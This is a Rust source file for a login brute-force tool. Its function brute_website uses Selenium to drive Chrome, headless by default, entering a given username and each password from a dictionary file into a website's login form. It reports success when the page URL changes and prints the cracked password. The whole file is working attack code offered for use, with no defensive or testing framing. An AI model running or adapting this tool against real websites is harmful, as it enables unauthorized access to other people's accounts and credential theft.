//std
use std::path::Path;
use std::process::exit;
use std::thread;
use std::time::Duration;

// extern
use selenium_webdriver::*;

// local
use crate::func::{restart, read_lines, string_to_static_str, color_terminal};

#[allow(dead_code)]
pub fn brute_website(website: String, username: String, password: String, button: String, user: String, dictionary: String, key: String, show_chrome: bool) {
    if website != "" && username != "" && password != "" && button != "" && user != "" && dictionary != "" {
        if Path::new(dictionary.trim()).exists() {
            let mut _args = vec![];
            if show_chrome == true {
                _args = vec!["--disable-popup-blocking", "--disable-extensions"];
            } else {
                _args = vec!["--headless", "--disable-popup-blocking", "--disable-extensions"];
            }
            let mut driver = Browser::start_session(BrowserName::Chrome, _args);
            let _ = driver.open(&*website).unwrap();
            let mut list_word = vec![String::from("")];
            if let Ok(lines) = read_lines(dictionary.trim()) {
                let mut attempt = 0;
                for line in lines {
                    if let Ok(pass) = line {
                        if pass.contains(&key) && list_word[attempt] != pass {
                            let _ = thread::sleep(Duration::new(1, 0));
                            let input_username = driver.find_element(LocatorStrategy::CSS(string_to_static_str(username.clone()))).unwrap();
                            let _ = input_username.send_keys(&*user);
                            let input_password = driver.find_element(LocatorStrategy::CSS(string_to_static_str(password.clone()))).unwrap();
                            let _ = input_password.send_keys(&*pass);
                            let btn = driver.find_element(LocatorStrategy::CSS(string_to_static_str(button.clone()))).unwrap();
                            attempt += 1;
                            list_word.push(pass.clone());
                            let _ = btn.click();
                            let _ = driver.open(&*website).unwrap();
                            let mut _link: String = driver.get_link().unwrap();
                            let _ = driver.refresh();
                            let _ = thread::sleep(Duration::new(2, 0));
                            _link = driver.get_link().unwrap();
                            if website != _link {
                                color_terminal(&*format!("[!] [TRIED] => SUCCESS | [PASSWORD] => {}, [USERNAME] => {}, ATTEMPT => {}", String::from(pass), user, attempt), "green");
                                let _ = driver.close_browser();
                                println!("\n");
                                restart();
                                break;
                            } else {
                                color_terminal(&*format!("[!] [TRIED] => FALSE | [PASSWORD] => {}, [USERNAME] => {}, ATTEMPT => {}", String::from(pass), user, attempt), "red");
                                continue;
                            }
                        }
                    }
                }
            }
        } else {
            color_terminal(&*format!("[!] [ERROR] The file ({}), You put does not exist :/", dictionary), "red");
            println!("\n");
            restart();
        }
    } else {
        color_terminal("[!] [ERROR] Please complete all fields ...", "red");
        println!("\n");
        restart();
    }
    exit(0);
}

